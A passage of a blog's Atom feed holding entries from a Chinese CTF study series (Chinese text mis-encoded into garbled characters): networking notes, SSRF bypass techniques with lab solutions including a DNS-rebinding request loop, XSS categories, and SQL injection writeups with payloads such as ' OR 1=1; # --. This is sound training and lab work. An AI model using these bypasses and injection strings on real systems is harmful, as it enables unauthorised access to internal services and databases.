<code>0.0.0.0/0</code> çš„ç¸®å¯«ï¼Œé‚£å¦‚æœæ²’æœ‰default gateway å°±æœƒæ‰¾ä¸åˆ°è·¯å¾‘ï¼Œå°±æœƒå‡ºç¾<code>Destination Host Unreachable</code></p><h3 id="tcp-vs-udp">TCP vs UDP <a href="#tcp-vs-udp" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/GzBbOug.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="udp">UDP <a href="#udp" class="headerlink"></a></h4><p>å°±æ˜¯ç›´æ¥ä¸Ÿéå»ï¼Œä¸ç®¡æœ‰æ²’æœ‰çœŸçš„æ”¶åˆ°</p><figure><img data-src="https://i.imgur.com/tdKM6ao.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h4 id="tcp">TCP <a href="#tcp" class="headerlink"></a></h4><p>å¦‚æœéœ€è¦å¯é ä¿¡å‚³é€ï¼Œè¦æ˜¯è³‡æ–™å¾ˆå¤§ç”¨ UDP å‚³éå»å¯èƒ½å°±æœƒå¾ˆç ´ç¢ï¼ŒTCPå°±æœƒæ¯æ¬¡éƒ½ç¢ºèªæœ‰æ²’æœ‰æ”¶åˆ°ï¼Œæœ‰æ”¶åˆ°å¾Œæ‰æœƒå‚³ä¸‹ä¸€å€‹</p><figure><img data-src="https://i.imgur.com/MEndg57.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/Xj2Qrqw.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/9wLfeyg.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/RJqKk88.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å› ç‚º TCP çš„æ•ˆèƒ½æœ‰é»å·®ï¼Œç¾åœ¨æœ‰ä¸€å€‹å«åš QUIC çš„å”å®šï¼Œä»–æ˜¯åŸºæ–¼ UDPçš„ï¼Œä½†æ˜¯ä»–æœ‰ TCP çš„åŠŸèƒ½ï¼Œæ‰€ä»¥æ•ˆèƒ½æœƒæ¯”è¼ƒå¥½</p><h3 id="port">Port <a href="#port" class="headerlink"></a></h3><p>å› ç‚ºä¸€å°é›»è…¦ä¸Šæœ‰å¾ˆå¤šç¨‹å¼ï¼Œæ‰€ä»¥è¦ç”¨ Port ä¾†å€åˆ†ï¼Œæ¯å€‹æœå‹™éƒ½æœ‰è‡ªå·±çš„Portï¼Œåƒæ˜¯ HTTP é è¨­æ˜¯ 80ï¼ŒHTTPS æ˜¯ 443</p><h3 id="nat">NAT <a href="#nat" class="headerlink"></a></h3><p>ç¾ä»Š IPv4 æœ€åš´é‡çš„å•é¡Œï¼Œå°±æ˜¯ IP æ•¸é‡ä¸å¤ ç”¨ï¼Œå› ç‚º IP æœ€å¤šå°±åªæœ‰<code>2^32</code> å€‹ï¼Œä¹Ÿå°±æ˜¯ <code>4,294,967,296</code> å€‹ï¼Œè€Œä¸”é‚„æœ‰ä¸€äº›IPæ˜¯ä¸èƒ½ç”¨çš„ï¼Œå¾ˆæ˜é¡¯ä¸å¯èƒ½è®“åœ°çƒä¸Šæ¯å€‹äººéƒ½èƒ½ç”¨ï¼Œé€™æ¨£å°±æœƒæœ‰äº›äººæ²’æœ‰è¾¦æ³•ç”¨ç¶²è·¯ï¼Œæ‰€ä»¥å°±æœ‰å…©å€‹è¾¦æ³•</p><ol type="1"><li>æ›ä¸€å€‹ IP çš„å”è­°: IPv6ï¼Œä½†å› ç‚ºç›®å‰å¾ˆå¤šæœå‹™éƒ½æ˜¯æ¶åœ¨ IPv4ä¸Šï¼Œå¤§å®¶ä¹Ÿéƒ½é‚„ç¿’æ…£ç”¨ IPv4ï¼Œæ‰€ä»¥çŸ­æœŸé–“å°±åªèƒ½ç”¨ä¸‹é¢é‚£å€‹æ–¹æ³•</li><li>NAT: æ—¢ç„¶æˆ‘å€‘ IP ä¸å¤ ç”¨ï¼Œé‚£å°±è®“ä¸€äº›é›»è…¦æœ‰ IP å°±å¥½ï¼Œå…¶ä»–é›»è…¦ç”¨å‡çš„IP<br><img data-src="https://i.imgur.com/kNC761j.png" alt="Image"><br><img data-src="https://i.imgur.com/mVPj0YS.png" alt="Image"><br>Router æœƒæœ‰ä¸€å€‹ NAT Table ä¾†è¨˜éŒ„æ¯å€‹è«‹æ±‚çš„ Source IP å’Œ DestinationIPï¼Œç„¶å¾Œå†æŠŠ Source IP æ”¹æˆ Router çš„IPï¼Œç„¶å¾Œå†æŠŠå°åŒ…é€å‡ºå»ï¼Œç•¶å°æ–¹å›æ‡‰æ™‚ï¼Œ Router æœƒæ ¹æ“š NAT TableæŠŠå°åŒ…é€åˆ°å°æ‡‰çš„é›»è…¦<br>ä½†é€™æ¨£é‚„æœ‰å€‹å•é¡Œï¼Œå¦‚æœæœ‰å€‹ Server æ¶åœ¨ NATå¾Œé¢ï¼Œå¤–é¢å°±æˆ³ä¸åˆ°ï¼Œè§£æ±ºçš„æ–¹æ³•å°±æ˜¯ Port Forwarding<br><img data-src="https://i.imgur.com/DbLNxvt.png" alt="Image"><br><img data-src="https://i.imgur.com/Vr2qpuD.png" alt="Image"><br>æœƒæŠŠå¤–é¢é€é€²æ‹‰çš„ Port è½‰æ›æˆå°æ‡‰çš„å…§éƒ¨ IP<br><a href="https://youtu.be/xleMUfUYbGw">How does NAT work</a></li></ol><h2 id="åƒè€ƒè³‡æ–™">åƒè€ƒè³‡æ–™ <a href="#åƒè€ƒè³‡æ–™" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ‰‹æŠŠæ‰‹ Python æ•™å­¸â€” å¾å…¥é–€åˆ°å…¥ä¾µ</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘ä¸æ˜¯ web3.0 çš„web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘LinuxåŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç†</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ·ºè«‡ç¶²è·¯èˆ‡H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€ &lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;æœ¬æ—¥é€²åº¦ï¼š&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z&quot;&gt;ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ·ºè«‡ç¶²è·¯èˆ‡
H T T P - åˆ° NAT&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="ä¸€ç›´åˆ· CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="è³‡å®‰" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 éµäººè³½ ä¸€ç›´åˆ· CTF - Day23</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day23/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day23/</id>
    <published>2024-09-25T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€ <a href="#å‰è¨€" class="headerlink"></a></h2><p>æœ¬æ—¥é€²åº¦ï¼š</p><ul class="task-list"><li><label><input type="checkbox" checked=""><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘ä¸æ˜¯ web3.0 çš„web3 - å®Œ</a></label></li></ul><span id="more"></span><h2 id="ä¸Šèª²ç´€éŒ„">ä¸Šèª²ç´€éŒ„ <a href="#ä¸Šèª²ç´€éŒ„" class="headerlink"></a></h2><h3 id="ssrf-server-side-request-forgery">SSRF (Server-Side RequestForgery) <a href="#ssrf-server-side-request-forgery" class="headerlink"></a></h3><ul><li>ä¼ºæœå™¨ç«¯è«‹æ±‚å½é€  (Server-Side Request Forgery)</li><li>ç¹éé˜²ç«ç‰†ï¼Œå­˜å–å…§ç¶²è¨­å‚™</li><li>å¤šæ•¸è³‡æ–™åº«ã€ mail server ç­‰æ©Ÿæ•è¨­å‚™æœƒé¸æ“‡æ¶åœ¨å…§ç¶²</li></ul><h4 id="å…ˆå›çœ‹-url-çš„å®šç¾©-rfc3986">å…ˆå›çœ‹ url çš„å®šç¾© rfc3986 <a href="#å…ˆå›çœ‹-url-çš„å®šç¾©-rfc3986" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/ljodqkf.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/0KUwmy1.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å°æ–¼ scheme çš„åˆ©ç”¨</p><ol type="1"><li>æœ¬åœ°<br><img data-src="https://i.imgur.com/rEcHVqA.png" alt="Image"></li><li>php å½å”è­°<br><img data-src="https://i.imgur.com/9K9Ymzg.png" alt="Image"></li></ol><h4 id="gopher">gopher <a href="#gopher" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/U0OVwny.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>ä½† gopher é€™å ‚èª²ä¸æœƒè©³ç´°è¬›é“ï¼Œä¹‹å¾Œå†çœ‹</p><h4 id="æª¢æŸ¥-authority-æ˜¯å¦åˆæ³•">æª¢æŸ¥ authority æ˜¯å¦åˆæ³• <a href="#æª¢æŸ¥-authority-æ˜¯å¦åˆæ³•" class="headerlink"></a></h4><p>ç›®æ¨™: æˆåŠŸå­˜å–å…§ç¶²çš„ ip ä½ç½®</p><p>å¯èƒ½è¢«é˜»æ“‹çš„æ–¹æ³•</p><ol type="1"><li><p>é»‘åå–®<br><img data-src="https://i.imgur.com/y1QBoom.png" alt="Image"></p><ul><li><p>ç ´è§£æ–¹æ³•ï¼š<br><img data-src="https://i.imgur.com/ueyAIFd.png" alt="Image"><br><img data-src="https://i.imgur.com/KvMPbY1.png" alt="Image"><br><img data-src="https://i.imgur.com/MUD32zD.png" alt="Image"></p><p>åˆ©ç”¨ Domain æ··æ·†<br><img data-src="https://i.imgur.com/sCh9gjp.png" alt="Image"></p></li></ul></li><li><p>ç™½åå–®<br><img data-src="https://i.imgur.com/Wup4aoG.png" alt="Image"></p><ul><li><p>ç ´è§£æ–¹æ³•ï¼š</p><p>åˆ©ç”¨ Open Redirect<br><img data-src="https://i.imgur.com/3wYfCiz.png" alt="Image"><br><code>https://google.com/amp/moon-jam.me</code> å°±æœƒè‡ªå‹•è½‰å€åˆ°<code>moon-jam.me</code><br><img data-src="https://i.imgur.com/ZS9eYR1.png" alt="Image"></p></li></ul></li><li><p>DNS è§£æå¾Œåˆ¤æ–·æ˜¯å¦åˆæ³•<br><img data-src="https://i.imgur.com/GHpEr4K.png" alt="Image"></p><ul><li><p>ç ´è§£æ–¹æ³•ï¼š</p><p>åˆ©ç”¨ DNS Rebinding<br><img data-src="https://i.imgur.com/NOvLsSl.png" alt="Image"></p><p><a href="https://lock.cmpxchg8b.com/rebinder.html">è£½ä½œ DNS Rebindingçš„ç¶²ç«™</a></p><p>ä¸Šä¸€ç§’çš„æ™‚å€™è§£ææ˜¯ <code>8.8.8.8</code> æ‰€ä»¥ä¸æœƒè¢«æ“‹æ‰<br><img data-src="https://i.imgur.com/ak0NxJ5.png" alt="Image"></p><p>ä½†ä¸‹ä¸€ç§’çš„æ™‚å€™è§£æå°±è®Šæˆ <code>127.0.0.1</code> äº†ï¼Œå°±èƒ½æˆåŠŸå­˜å–å…§ç¶²ip<br><img data-src="https://i.imgur.com/LIVN8Dd.png" alt="Image"></p><p>orange åšçš„ç¥å¥‡æ±è¥¿ï¼Œåœ¨ä¸åŒæœå‹™è§£æå‡ºä¾†çš„çµæœä¸ä¸€æ¨£<br><img data-src="https://i.imgur.com/qqfvEfU.png" alt="Image"></p></li></ul></li></ol><h3 id="lab---ssrf-1">Lab - ssrf 1 <a href="#lab---ssrf-1" class="headerlink"></a></h3><p>ç”¨ä¹‹å‰ä»‹ç´¹çš„æ–¹æ³•ï¼Œåˆ©ç”¨ <code>http://0</code> æœƒè¢«ç•¶æˆ<code>http://localhost</code> ï¼Œæ‰€ä»¥å°±å¯ä»¥æˆåŠŸå­˜å–å…§ç¶² ip</p><figure><img data-src="https://i.imgur.com/jGfydVd.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="lab---ssrf-2">Lab - ssrf 2 <a href="#lab---ssrf-2" class="headerlink"></a></h3><p>çœ‹ä»–çš„ç¨‹å¼ç¢¼çŸ¥é“ç¶²å€çš„é–‹é ­è¦æ˜¯ <code>httpbin.dev</code> ï¼Œå»<code>https://httpbin.dev</code> çœ‹çœ‹æœ‰ä»€éº¼æ±è¥¿ï¼Œç™¼ç¾äº†</p><figure><img data-src="https://i.imgur.com/Zm0JXIU.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>æ–¼æ˜¯åªè¦ä½¿ç”¨<code>https://httpbin.dev/redirect-to?url=http://localhost/internal-only</code>å°±å¯ä»¥æˆåŠŸå­˜å–å…§ç¶² ip æ‹¿ç›ª flag äº†</p><h3 id="lab---ssrf-3">Lab - ssrf 3 <a href="#lab---ssrf-3" class="headerlink"></a></h3><p>é€™ææ˜¯ç”¨ DNS Rebindingçš„æ–¹å¼ï¼Œä½†è©¦äº†å¥½å¹¾æ¬¡éƒ½æ²’æˆåŠŸï¼Œåªå¥½ä¾†å¯«å€‹ç¨‹å¼ä»¥é‡å–å‹</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://chall.nckuctf.org:28123/mkreq?url=http%3A%2F%2F7f000001.c0a80001.rbndr.us%2Finternal-only"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"NCKU"</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></tbody></table></figure><p>ç„¶å¾Œè·‘ä¸€ä¸‹ä¸‹ä¹‹å¾Œå°±æ‹¿åˆ° flag äº†</p><h3 id="front-end-security">Front-end Security <a href="#front-end-security" class="headerlink"></a></h3><p>é™¤äº† XSS å’Œ CSRF ä¹‹å¤–ï¼Œé‚„æœ‰å¾ˆå¤šå…¶ä»–çš„é…·æ±è¥¿</p><figure><img data-src="https://i.imgur.com/L8o8SWr.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><blockquote><p>ç¶²é å‰ç«¯æœ¬èº«çš„é™åˆ¶ï¼Œä¾‹å¦‚èªªä¸å¯èƒ½å–®ç´”é€éç¶²é è®“ä½ å®¶çš„å°è¡¨æ©Ÿåˆ—å°æ±è¥¿ï¼Œéœ€è¦ä¸€å€‹æœ¬åœ°çš„ä¼ºæœå™¨ï¼Œè®“ç¶²é å»æˆ³æœ¬åœ°ä¼ºæœå™¨ï¼Œå†ç”±æœ¬åœ°ä¼ºæœå™¨å»æˆ³å°è¡¨æ©Ÿ</p></blockquote><p>So</p><figure><img data-src="https://i.imgur.com/ao7YNDA.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/RvwTkNK.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>é€™å€‹ CVE åªè¦ä½ é»é–‹ä¸€å€‹ç¶²é ï¼Œä½ çš„å°ç®—ç›¤å°±æœƒè·³å‡ºä¾†</p><figure><img data-src="https://i.imgur.com/6oxMp54.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>æˆ–è€…æ˜¯å¾ˆå¤šäººç”¨çš„ electronï¼ŒèƒŒå¾Œå…¶å¯¦ä¹Ÿç®—æ˜¯ä¸€å€‹ç€è¦½å™¨ï¼Œä¹Ÿæœ‰å¯èƒ½è¢«æ”»æ“Š</p><h4 id="xss">XSS <a href="#xss" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/20CaJLG.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>Self-XSS: åªèƒ½æ”»æ“Šè‡ªå·±çš„ XSSï¼Œä½†å¯èƒ½å¯ä»¥é€éå…¶ä»–æ”»æ“Šæ‰‹æ³•é€ æˆæ›´åš´é‡çš„å½±éŸ¿</p><figure><img data-src="https://i.imgur.com/Dp5Rdw5.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>Blind-XSS: XSS åœ¨ä¸çŸ¥é“ç”šéº¼æ™‚å€™å¯èƒ½æœƒè¢«è§¸ç™¼ï¼Œä¾‹å¦‚ç•¶ä½ æŠŠåå­—æ”¹æˆ XSSpayload</p><p>æœ‰å€‹äººæŠŠè‡ªå·±ç‰¹æ–¯æ‹‰çš„åå­—æ”¹æˆ XSS payloadï¼Œæœ‰å¤©è»Šå£äº†æ‹¿å»é€ä¿®ï¼Œçµæœå‰›å¥½ XSS payload è¢«è§¸ç™¼ï¼Œæ‹¿åˆ° 10000 USD çš„ BugBounty</p><figure><img data-src="https://i.imgur.com/YeJOIpu.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/MyJkVIk.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>åˆ†é¡</p><ol type="1"><li>Relfected XSS (Non-persistent XSS)<br><img data-src="https://i.imgur.com/YsfFT77.png" alt="Image"><br><img data-src="https://i.imgur.com/LPdmuv6.png" alt="Image"><br><img data-src="https://i.imgur.com/vDv01Cl.png" alt="Image"></li><li>Stored XSS (Persistent XSS)<br><img data-src="https://i.imgur.com/gHNMDqY.png" alt="Image"></li><li>DOM-based XSS<br><img data-src="https://i.imgur.com/LgsjI8p.png" alt="Image"></li></ol><p>å¸¸è¦‹ payload</p><p><img data-src="https://i.imgur.com/Py4uauU.png" alt="Image"><br><img data-src="https://i.imgur.com/NqehmvQ.png" alt="Image"><br><img data-src="https://i.imgur.com/zz3gOLj.png" alt="Image"><br><img data-src="https://i.imgur.com/5d5QwDo.png" alt="Image"></p><p>å¸¸è¦‹ payload - javascript å½å”è­°</p><figure><img data-src="https://i.imgur.com/Zcrcv4g.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>é¿å… <code>htmlescape</code></p><figure><img data-src="https://i.imgur.com/eszQLas.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/uxmNqn4.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><figure><img data-src="https://i.imgur.com/b2RFaqC.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>å› ç‚º javascript å½å”è­°å¯ä»¥ä¸åŒ…å«ä»»ä½•é›™å¼•è™Ÿï¼Œæ‰€ä»¥å°±å¯ä»¥ç¹é<code>htmlescape</code></p><p>å¸¸è¦‹ payload - innerHTML bitfall</p><p><img data-src="https://i.imgur.com/OJoDskQ.png" alt="Image"><br><img data-src="https://i.imgur.com/2ipNEu0.png" alt="Image"><br><img data-src="https://i.imgur.com/M2Q4HXC.png" alt="Image"><br><img data-src="https://i.imgur.com/44i3u6n.png" alt="Image"></p><p><a href="https://xss-game.appspot.com/">ç© XSS game~</a></p><h4 id="xss-worm">XSS worm <a href="#xss-worm" class="headerlink"></a></h4><figure><img data-src="https://i.imgur.com/JMbinYv.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="todo">TODO <a href="#todo" class="headerlink"></a></h3><p>ææ‡‚é‚£ XSS Lab æ€éº¼æ‹¿åˆ° Flag</p><h2 id="åƒè€ƒè³‡æ–™">åƒè€ƒè³‡æ–™ <a href="#åƒè€ƒè³‡æ–™" class="headerlink"></a></h2><ul><li><a href="https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ‰‹æŠŠæ‰‹ Python æ•™å­¸â€” å¾å…¥é–€åˆ°å…¥ä¾µ</a></li><li><a href="https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB1</a></li><li><a href="https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘WEB2</a></li><li><a href="https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘ä¸æ˜¯ web3.0 çš„web3 - Vincent55</a></li><li><a href="https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto1</a></li><li><a href="https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘Crypto2</a></li><li><a href="https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘LinuxåŸºç¤æŒ‡ä»¤èˆ‡ä½¿ç”¨è€…ç®¡ç†</a></li><li><a href="https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z">ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘æ·ºè«‡ç¶²è·¯èˆ‡H T T P</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;å‰è¨€ &lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;æœ¬æ—¥é€²åº¦ï¼š&lt;/p&gt;
&lt;ul class=&quot;task-list&quot;&gt;
&lt;li&gt;&lt;label&gt;&lt;input type=&quot;checkbox&quot; checked=&quot;&quot;&gt;&lt;a href=&quot;https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV&quot;&gt;ã€æˆå¤§è³‡å®‰ç¤¾ç¤¾èª²ã€‘ä¸æ˜¯ web3.0 çš„
web3 - å®Œ&lt;/a&gt;&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
    <category term="ä¸€ç›´åˆ· CTF" scheme="https://moon-jam.me/categories/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/%E4%B8%80%E7%9B%B4%E5%88%B7-CTF/"/>
    
    
    <category term="è³‡å®‰" scheme="https://moon-jam.me/tags/%E8%B3%87%E5%AE%89/"/>
    
    <category term="CTF" scheme="https://moon-jam.me/tags/CTF/"/>
    
    <category term="IThome 2024 éµäººè³½" scheme="https://moon-jam.me/tags/IThome-2024-%E9%90%B5%E4%BA%BA%E8%B3%BD/"/>
    
  </entry>
  
  <entry>
    <title>IThome 2024 éµäººè³½ ä¸€ç›´åˆ· CTF - Day22</title>
    <link href="https://moon-jam.me/IThome_2024ironman_CTF_Day22/"/>
    <id>https://moon-jam.me/IThome_2024ironman_CTF_Day22/</id>
    <published>2024-09-24T16:00:00.000Z</published>
    <updated>2025-08-19T09:24:30.306Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€ <a href="#å‰è¨€" class="headerlink"></a></h2><p>æœ¬æ—¥é€²åº¦ï¼š</p><ul class="task-list"><li><label><input type="checkbox" checked="">7 é¡Œ web</label></li></ul><span id="more"></span><h2 id="writeup">Writeup <a href="#writeup" class="headerlink"></a></h2><h3 id="ç¬¬ä¸€é¡Œsql-direct">ç¬¬ä¸€é¡Œï¼šSQL Direct <a href="#ç¬¬ä¸€é¡Œsql-direct" class="headerlink"></a></h3><figure><img data-src="https://i.imgur.com/gdwtG9F.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>æŸ¥äº†ä¸€ä¸‹çŸ¥é“å¯ä»¥ç”¨ çœ‹çœ‹ table çš„ schemaï¼Œæœ€å¾Œå†ç”¨<code>select * from flags;</code> çœ‹çœ‹ table çš„å…§å®¹</p><figure><img data-src="https://i.imgur.com/hG7qOvE.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="ç¬¬äºŒé¡Œirish-name-repo-1">ç¬¬äºŒé¡Œï¼šIrish-Name-Repo 1 <a href="#ç¬¬äºŒé¡Œirish-name-repo-1" class="headerlink"></a></h3><p>ç°¡å–®çš„ SQL Injectionï¼Œç”¨ <code>' OR 1=1; # --</code> è¼¸å…¥å°±å¯ä»¥äº†</p><figure><img data-src="https://i.imgur.com/lXfbGfJ.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="ç¬¬ä¸‰é¡Œirish-name-repo-2">ç¬¬ä¸‰é¡Œï¼šIrish-Name-Repo 2 <a href="#ç¬¬ä¸‰é¡Œirish-name-repo-2" class="headerlink"></a></h3><p>é€™é¡Œå¥½åƒæ˜¯æœƒæŠŠ <code>OR</code> éæ¿¾æ‰ï¼Œæ‰€ä»¥è©¦äº†ä¸€ä¸‹ä¹‹å¾Œåªè¦ç”¨<code>admin'; -- #</code> å°±å¯ä»¥äº†</p><figure><img data-src="https://i.imgur.com/uCvR9VP.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><h3 id="ç¬¬å››é¡Œirish-name-repo-3">ç¬¬å››é¡Œï¼šIrish-Name-Repo 3 <a href="#ç¬¬å››é¡Œirish-name-repo-3" class="headerlink"></a></h3><p>é€™é¡Œåªæœ‰ password å¯ä»¥è¼¸å…¥ï¼Œè©¦è©¦çœ‹ <code>' OR 1=1; -- #</code>ç™¼ç¾ä¸è¡Œï¼Œæƒ³ä¸åˆ°å…¶ä»–æ–¹æ³•å°±é–‹å€‹ Burp Suite çœ‹ä¸€ä¸‹ï¼Œç™¼ç¾ä»–å¾Œé¢æœƒè‡ªå¸¶ä¸€å€‹<code>&amp;debug=0</code> ï¼Œè©¦è©¦çœ‹æ”¹æˆ 1 ï¼Œæœƒç™¼ç¾ä»–æŠŠ SQL queryé¡¯ç¤ºå‡ºä¾†äº†</p><figure><img data-src="https://i.imgur.com/snbplhQ.png" alt="Image"><figcaption aria-hidden="true">Image</figcaption></figure><p>æˆ‘ç™¼ç¾ä»–æŠŠ <code>OR</code> è®Šæˆ <code>BE</code> äº†ï¼Œä¼¼ä¹æ˜¯<code>rot13</code> ï¼Œæ‰€ä»¥æˆ‘æŠŠ <code>OR</code> æ”¹æˆ 